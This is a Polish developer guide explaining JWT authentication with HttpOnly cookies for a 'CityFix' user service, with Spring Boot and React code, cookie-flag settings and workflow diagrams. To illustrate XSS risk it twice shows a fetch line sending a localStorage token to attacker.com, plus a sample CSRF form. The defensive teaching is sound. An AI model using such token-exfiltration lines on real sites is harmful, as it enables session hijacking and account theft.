# JWT w Cookies - Przewodnik Szczegółowy

## Spis Treści
1. [Jak Działa JWT](#jak-działa-jwt)
2. [Cookies vs LocalStorage](#cookies-vs-localstorage)
3. [Sesje w User Service](#sesje-w-user-service)
4. [Bezpieczeństwo](#bezpieczeństwo)
5. [Implementacja](#implementacja)
6. [Workflow Autentykacji](#workflow-autentykacji)

---

## Jak Działa JWT

### JWT (JSON Web Token)

JWT to token bezstanowy (stateless) składający się z 3 części:

```
header.payload.signature
```

#### 1. Header
```json
{
  "alg": "HS512",
  "typ": "JWT"
}
```

#### 2. Payload
```json
{
  "sub": "johndoe",
  "iat": 1673612000,
  "exp": 1673698400,
  "userId": 1
}
```

#### 3. Signature
```
HMACSHA512(
  base64UrlEncode(header) + "." +
  base64UrlEncode(payload),
  secret
)
```

### Czym JWT Nie Jest

- ❌ **Szyfrowany** - Tylko podpisany (dapat być dekodowany)
- ❌ **Sesja** - Jest bezstanowy
- ❌ **Hasło** - To token dostępu

---

## Cookies vs LocalStorage

### LocalStorage (STARE PODEJŚCIE)

**Jak Pracowało:**

1. Login → Server zwraca token w body
2. Frontend zapisuje w `localStorage`
3. Frontend ręcznie dodaje header `Authorization: Bearer token`
4. Server waliduje token z headera

**Problemy:**
```javascript
// Podatne na XSS ataki!
localStorage.setItem('token', jwtToken);
const token = localStorage.getItem('token'); // Dostępne dla atakującego JS!
fetch(url, {
  headers: {
    'Authorization': `Bearer ${token}`
  }
});
```

**Zagrożenia XSS:**
```javascript
// Atakujący kod w JS:
fetch('https://attacker.com?token=' + localStorage.getItem('token'));
```

---

### Cookies HttpOnly (NASZE PODEJŚCIE)

**Jak Pracuje:**

1. Login → Server ustawia cookie HttpOnly
2. Browser **automatycznie** wysyła cookie
3. Frontend **nie widzi** tokenu
4. Server wyodrębnia token z cookies

**Zalety:**

```
HTTP/1.1 200 OK
Set-Cookie: JWT_TOKEN=eyJhbGciOi...; HttpOnly; Secure; SameSite=Strict
```

```javascript
// Frontend nie ma dostępu do tokenu!
console.log(document.cookie); // Pusty!

// Ale cookie jest wysyłane automatycznie
fetch('https://api.cityfix.com/users/1'); // Cookie jest w żądaniu!
```

**Ochrona Przed XSS:**
- Atakujący kod **nie może** ukraść tokenu z `document.cookie`
- Token jest zabezpieczony na poziomie przeglądarki

---

## Sesje w User Service

### Typ Sesji: Stateless (Bezstanowy)

User Service używa **sesji bezstanowych** (stateless sessions):

```
┌─────────────┐
│   Client    │
│  Browser    │
└──────┬──────┘
       │
       │ 1. POST /users/login
       ├──────────────────────>
       │
       │ 2. Set-Cookie: JWT_TOKEN=xyz
       │<──────────────────────
       │
       │ 3. GET /users/1
       │    (Cookie wysyłane automatycznie)
       ├──────────────────────>
       │
       │ 4. Serwer waliduje JWT
       │    (Nie sprawdza bazy danych sesji)
       │<──────────────────────
       │
```

### Brak Tabeli Sesji

W przeciwieństwie do tradycyjnych sesji, **nie mamy tabeli `sessions`**:

```sql
-- TRADYCYJNA SESJA (Nie stosujemy)
CREATE TABLE sessions (
  id VARCHAR(32) PRIMARY KEY,
  user_id INTEGER,
  data TEXT,
  expires_at TIMESTAMP
);

-- NASZE PODEJŚCIE: JWT w cookies
-- Wszystko w tokenie! Bez bazy danych.
```

### Zawartość Sesji

Sesja jest **całkowicie zawarta w JWT tokenie**:

```json
{
  "sub": "johndoe",        // Username
  "userId": 1,             // User ID
  "iat": 1673612000,       // Issued at
  "exp": 1673698400,       // Expiration
  "iss": "cityfix-api",    // Issuer
  "aud": "cityfix-users"   // Audience
}
```

**Zalety:**
- ✅ Brak bazy danych sesji
- ✅ Stateless - skaluje się poziomo
- ✅ Szybsze (nie trzeba queryować BD)
- ✅ Distribuowane - każdy serwer może walidować

**Wady:**
- ⚠️ Nie można odwołać tokenu natychmiast (aż do expiration)
- ⚠️ Zmiana uprawnień - opóźnienie

---

## Bezpieczeństwo

### Flagi Cookies

```
Set-Cookie: JWT_TOKEN=<token>;
  Path=/;               // Dostępne na całej ścieżce
  HttpOnly;             // Nie dostępne z JS
  Secure;               // Tylko HTTPS (produkcja)
  SameSite=Strict;      // Ochrona przed CSRF
  Max-Age=86400;        // Wygaśnięcie za 24h
```

### Ochrona Przed CSRF

**CSRF (Cross-Site Request Forgery):**

```
Atakujący webs:
<form action="https://api.cityfix.com/users/1" method="POST">
  <input type="hidden" name="phone" value="+48666">
</form>
```

**Ochrona SameSite=Strict:**
- Cookie **nie jest wysyłane** z cross-site requestów
- Jest wysyłane tylko z same-site requestów

### Ochrona Przed XSS

**XSS (Cross-Site Scripting):**

```javascript
// Atakujący kod:
fetch('https://attacker.com?token=' + localStorage.getItem('token'));
```

**HttpOnly Protection:**
- `localStorage` jest dostępne dla JS
- `HttpOnly` cookies **nie są dostępne** dla JS
- Atolkenci w cookies są bezpieczne

### Ochrona Przed Session Fixation

```
1. Atakujący generuje token X
2. Atakujący przekonuje użytkownika do logowania
3. Serwer generuje nowy token Y
4. Cookie zawierającą Y zastępuje X
5. Atakujący nie ma dostępu do Y
```

---

## Implementacja

### Server-Side (Java Spring Boot)

#### 1. Generowanie JWT

```java
@Component
public class JwtTokenProvider {
    @Value("${jwt.secret}")
    private String jwtSecret;
    
    @Value("${jwt.expiration}")
    private long jwtExpiration;
    
    public String generateToken(String username) {
        return Jwts.builder()
                .subject(username)
                .issuedAt(new Date())
                .expiration(new Date(System.currentTimeMillis() + jwtExpiration))
                .signWith(getSigningKey(), SignatureAlgorithm.HS512)
                .compact();
    }
}
```

#### 2. Ustawianie Cookies

```java
@RestController
@RequestMapping("/users")
public class UserController {
    
    @PostMapping("/login")
    public ResponseEntity<LoginResponse> login(
            @Valid @RequestBody LoginRequest request,
            HttpServletResponse response) {
        
        LoginResponse loginResponse = userService.login(request);
        
        // Ustawienie cookie
        Cookie cookie = new Cookie("JWT_TOKEN", loginResponse.getToken());
        cookie.setHttpOnly(true);      // Nie dostępne z JS
        cookie.setSecure(true);        // Tylko HTTPS
        cookie.setPath("/");           // Dostępne na całej ścieżce
        cookie.setMaxAge(86400);       // 24 godziny
        cookie.setAttribute("SameSite", "Strict");
        
        response.addCookie(cookie);
        
        return ResponseEntity.ok(loginResponse);
    }
}
```

#### 3. Wyodrębnianie JWT z Cookies

```java
@Component
public class JwtAuthenticationFilter extends OncePerRequestFilter {
    
    @Override
    protected void doFilterInternal(HttpServletRequest request, 
                                   HttpServletResponse response, 
                                   FilterChain filterChain) 
            throws ServletException, IOException {
        
        // Wyodrębnienie JWT z cookies
        String token = null;
        if (request.getCookies() != null) {
            for (Cookie cookie : request.getCookies()) {
                if ("JWT_TOKEN".equals(cookie.getName())) {
                    token = cookie.getValue();
                    break;
                }
            }
        }
        
        // Walidacja tokenu
        if (token != null && jwtTokenProvider.validateToken(token)) {
            String username = jwtTokenProvider.getUsernameFromToken(token);
            UsernamePasswordAuthenticationToken auth = 
                new UsernamePasswordAuthenticationToken(username, null, new ArrayList<>());
            SecurityContextHolder.getContext().setAuthentication(auth);
        }
        
        filterChain.doFilter(request, response);
    }
}
```

#### 4. Wylogowanie

```java
@PostMapping("/logout")
public ResponseEntity<Map<String, String>> logout(HttpServletResponse response) {
    // Usunięcie cookie
    Cookie cookie = new Cookie("JWT_TOKEN", null);
    cookie.setHttpOnly(true);
    cookie.setSecure(true);
    cookie.setPath("/");
    cookie.setMaxAge(0);  // Natychmiastowe usunięcie
    
    response.addCookie(cookie);
    
    return ResponseEntity.ok(Map.of("message", "Logged out successfully"));
}
```

### Client-Side (Frontend)

#### JavaScript - Brak Kodu JWT!

```javascript
// Rejestracja
const registerUser = async (userData) => {
  const response = await fetch('https://api.cityfix.com/users/register', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify(userData),
    credentials: 'include' // Ważne! Wysyła cookies
  });
  return response.json();
};

// Logowanie
const loginUser = async (username, password) => {
  const response = await fetch('https://api.cityfix.com/users/login', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ username, password }),
    credentials: 'include' // Cookie ustawiana automatycznie!
  });
  
  // Nie trzeba wyodrębniać tokenu!
  return response.json();
};

// Żądanie Autentykowane
const getProfile = async (userId) => {
  const response = await fetch(`https://api.cityfix.com/users/${userId}`, {
    method: 'GET',
    credentials: 'include' // Cookie wysyłana automatycznie!
  });
  return response.json();
};

// Wylogowanie
const logoutUser = async () => {
  const response = await fetch('https://api.cityfix.com/users/logout', {
    method: 'POST',
    credentials: 'include' // Cookie wysyłana, potem usuwana
  });
  return response.json();
};
```

#### React Example

```javascript
import { useState } from 'react';

export function LoginPage() {
  const [username, setUsername] = useState('');
  const [password, setPassword] = useState('');
  
  const handleLogin = async (e) => {
    e.preventDefault();
    
    const response = await fetch('/api/users/login', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      credentials: 'include', // Cookie automatycznie!
      body: JSON.stringify({ username, password })
    });
    
    if (response.ok) {
      // Redirect do dashboard
      // Nie przechowujemy tokenu - jest w cookies!
      window.location.href = '/dashboard';
    }
  };
  
  return (
    <form onSubmit={handleLogin}>
      <input value={username} onChange={e => setUsername(e.target.value)} />
      <input value={password} onChange={e => setPassword(e.target.value)} />
      <button type="submit">Login</button>
    </form>
  );
}
```

---

## Workflow Autentykacji

### 1. Rejestracja

```
┌──────────────┐
│   Frontend   │
└──────┬───────┘
       │ POST /users/register
       │ { username, email, password, ... }
       ▼
┌──────────────────┐
│  UserController  │
│  .register()     │
└──────┬───────────┘
       │
       ▼
┌──────────────────┐
│   UserService    │
│   .register()    │
└──────┬───────────┘
       │
       ├─ Walidacja
       ├─ BCrypt.encode(password)
       ├─ Zapis do BD
       │
       ▼
┌──────────────────┐
│  201 Created     │
│  { id, username, │
│    email, ... }  │
└──────────────────┘
```

### 2. Logowanie

```
┌──────────────┐
│   Frontend   │
└──────┬───────┘
       │ POST /users/login
       │ { username, password }
       ▼
┌──────────────────┐
│  UserController  │
│  .login()        │
└──────┬───────────┘
       │
       ▼
┌──────────────────┐
│   UserService    │
│   .login()       │
└──────┬───────────┘
       │
       ├─ Wyszukanie użytkownika
       ├─ BCrypt.matches(password, hash)
       ├─ JWT.generate(username)
       │
       ▼
┌──────────────────────────┐
│  200 OK                  │
│  Set-Cookie: JWT_TOKEN   │
│  { id, username, email } │
└──────────────────────────┘
       │
       ▼
┌──────────────────────────┐
│   Browser                │
│   Zapisuje cookie        │
│   (automatycznie!)       │
└──────────────────────────┘
```

### 3. Żądanie Autentykowane

```
┌──────────────┐
│   Frontend   │
└──────┬───────┘
       │ GET /users/1
       │ (Cookie wysyłane automatycznie!)
       ▼
┌──────────────────────────┐
│   Request Headers        │
│ Cookie: JWT_TOKEN=...    │
└──────┬───────────────────┘
       │
       ▼
┌──────────────────────────┐
│  JwtAuthenticationFilter │
└──────┬───────────────────┘
       │
       ├─ Wyodrębnia JWT z cookies
       ├─ JWT.validate(token)
       ├─ Username = JWT.getSubject()
       ├─ SecurityContext.setAuthentication()
       │
       ▼
┌──────────────────┐
│  UserController  │
│  .getUser()      │
└──────┬───────────┘
       │
       ▼
┌──────────────────┐
│  200 OK          │
│  { user data }   │
└──────────────────┘
```

### 4. Wylogowanie

```
┌──────────────┐
│   Frontend   │
└──────┬───────┘
       │ POST /users/logout
       │ (Cookie wysyłane automatycznie!)
       ▼
┌──────────────────┐
│  UserController  │
│  .logout()       │
└──────┬───────────┘
       │
       ├─ Ustawia cookie Max-Age=0
       │
       ▼
┌────────────────────────────────┐
│  200 OK                        │
│  Set-Cookie: JWT_TOKEN=;       │
│           Max-Age=0            │
└────────────────────────────────┘
       │
       ▼
┌──────────────────────────┐
│   Browser                │
│   Usuwa cookie           │
│   (Sesja zakończona)     │
└──────────────────────────┘
```

---

## Porównanie: Stara vs Nowa Metoda

### Stara: Bearer Token w LocalStorage

```
1. Login → Zwrócony token
2. Frontend: localStorage.setItem('token', token)
3. Każde żądanie: headers: { Authorization: `Bearer ${token}` }
4. Zagrożenie: XSS może ukraść token
5. Logout: localStorage.removeItem('token')
```

### Nowa: JWT w HttpOnly Cookies

```
1. Login → Cookie ustawiona
2. Frontend: Nic! (automatyczne)
3. Każde żądanie: Cookie wysłana automatycznie
4. Bezpieczeństwo: XSS nie może ukraść tokenu
5. Logout: Cookie usunięta (Max-Age=0)
```

---

## Checklist Wdrażania

- [ ] JWT secret 256-bit
- [ ] HttpOnly flag na cookies
- [ ] Secure flag (produkcja)
- [ ] SameSite=Strict
- [ ] HTTPS w produkcji
- [ ] Path=/
- [ ] Max-Age ustawiony
- [ ] CORS properly configured
- [ ] credentials: 'include' na frontendzie
- [ ] Testowanie logowania/wylogowania

